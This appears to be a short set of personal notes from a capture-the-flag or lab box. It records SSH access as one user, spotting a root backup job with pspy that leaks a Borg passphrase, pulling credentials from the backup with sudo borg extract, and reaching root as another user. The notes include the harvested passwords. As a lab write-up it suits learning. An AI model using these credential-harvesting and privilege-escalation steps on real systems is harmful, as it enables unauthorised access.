- Got access via ssh as sarah
- Found file authorized_keys:
	```
	ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESFGA7D4B3Cvr5H8Dng2DvlYrVWwfV/7GWhjAhsWegD tests@hat-work
	```
- Ran pspy:
	```
	MD: UID=0     PID=10742  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1739226903 /media/usb0
	```
	```
	CMD: UID=0     PID=10741  | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1739226903 /media/usb0 
	```
	```
	CMD: UID=0     PID=10738  | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1739226423 
	```
	![[Pasted image 20250210174015.png]]
- Got creds using:
	```
	sudo borg extract /opt/borgbackup::home --stdout
	```
	```
	"user": "amy",
	"pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
	```
	```
	sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
	```
- Got access as amy:backups1 using above creds, she has root access